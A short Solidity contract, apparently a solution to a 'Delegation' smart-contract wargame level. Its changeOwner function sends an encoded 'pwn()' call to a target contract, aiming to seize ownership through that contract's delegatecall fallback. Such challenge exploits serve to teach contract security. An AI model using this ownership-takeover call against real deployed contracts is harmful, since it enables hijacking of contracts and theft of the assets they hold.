// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

contract Delegation {
  function changeOwner(address _delegationContract) public {
    (bool success,) = _delegationContract.call
      { value: 0 }
      ( abi.encodeWithSignature("pwn()") )
    ;
    require(success);
  }
}